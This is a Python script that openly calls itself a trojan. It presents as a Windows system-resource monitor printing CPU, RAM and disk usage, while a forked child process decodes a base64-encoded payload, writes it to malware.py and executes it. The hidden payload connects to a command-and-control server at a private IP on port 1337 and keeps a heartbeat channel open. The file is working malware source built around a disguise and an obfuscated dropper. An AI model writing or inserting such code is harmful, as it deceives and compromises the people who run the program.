import psutil
import base64
import time
import os
import platform
import multiprocessing

def main():
    OS = platform.system()
    
    if OS == 'Windows':
        windows()
        
def windows():
    try: 
        # try to fork the trojan as the child process
        windows_fork()

        # get the process name
        process = multiprocessing.current_process().name

        # if it is the main process
        if process == 'MainProcess':
            while True:
                cpu = psutil.cpu_percent()
                ram = psutil.virtual_memory().percent
                disk = psutil.disk_usage("/").percent
                processes_count = 0

                for _ in psutil.process_iter():
                    processes_count += 1

                # printing the things
                print("---------------------------------------------------------")
                print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
                print("| {:02}%       | {:02}%       | {:02}%        | {}               |".format(int(cpu), int(ram), int(disk), processes_count))
                print("---------------------------------------------------------")

                # print every 3 seconds
                time.sleep(2)
    except:
        print("Stopping program...")
    

    # if it is not the main process, execute this function
    else:
        windowsTrojan()

# the trojan itself
def windowsTrojan():
    malware_fd = open(".\\malware.py", "w")
    blob = "aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgc29ja2V0DQppbXBvcnQgYmFzZTY0DQppbXBvcnQganNvbg0KaW1wb3J0IG9zDQppbXBvcnQgdGltZQ0KDQpkZWYgc2VuZF9oZWFydGJlYXQoY2xpZW50X3NvY2tldCk6DQogICAgdHJ5Og0KICAgICAgICBjbGllbnRfc29ja2V0LnNlbmQoYiJIZWFydGJlYXQiKQ0KICAgIGV4Y2VwdCBzb2NrZXQuZXJyb3I6DQogICAgICAgIHByaW50KCJFcnJvciBzZW5kaW5nIGhlYXJ0YmVhdCIpDQogICAgICAgICMgSGFuZGxlIHNvY2tldCBlcnJvciAoZS5nLiwgY29ubmVjdGlvbiBsb3N0KQ0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICByZXR1cm4gVHJ1ZQ0KdHJ5Og0KICAgICMgY3JlYXRlIGEgc29ja2V0IG9iamVjdA0KICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgIyBjb25uZWN0IHRvIGNvbW1hbmQgYW5kIGNvbnRyb2wgc2VydmVyIG9uIHBvcnQgMTMzNw0KICAgIHMuY29ubmVjdCgoIjE5Mi4xNjguMTguMSIsIDEzMzcpKQ0KZXhjZXB0OiBwcmludCgiaiIpDQpkZWYgbWFpbigpOg0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGRhdGEgPSBzLnJlY3YoNDA5NikNCiAgICAgICAgICAgIGlmIG5vdCBkYXRhOg0KICAgICAgICAgICAgICAgIHByaW50KCJDb25uZWN0aW9uIGNsb3NlZCBieSB0aGUgc2VydmVyLiIpDQogICAgICAgICAgICAgICAgYnJlYWsNCg0KICAgICAgICAgICAgIyBIYW5kbGUgZGlmZmVyZW50IHR5cGVzIG9mIHNlcnZlciByZXF1ZXN0cw0KICAgICAgICAgICAgaWYgZGF0YSA9PSBiIlJlcXVlc3RfSGVhcnRiZWF0IjoNCiAgICAgICAgICAgICAgICAjIFJlc3BvbmQgdG8gaGVhcnRiZWF0IHJlcXVlc3QNCiAgICAgICAgICAgICAgICBzZW5kX2hlYXJ0YmVhdChzKQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvciBhcyBlOg0KICAgICAgICAgICAgcHJpbnQoZiJFcnJvciByZWNlaXZpbmcgZGF0YToge2V9IikNCiAgICAgICAgICAgIGJyZWFrDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0K"
    malware = base64.b64decode(blob).decode("UTF-8")
    malware_fd.write(malware)
    malware_fd.close()

# function to call windowsTrojan as the child process
def windows_fork():
    process = multiprocessing.Process(target=windowsTrojan, name="ChildProcess")
    process.start()
    process.join()

    # execute the malware
    os.system("python3 malware.py")

if __name__ == "__main__":  
    main()
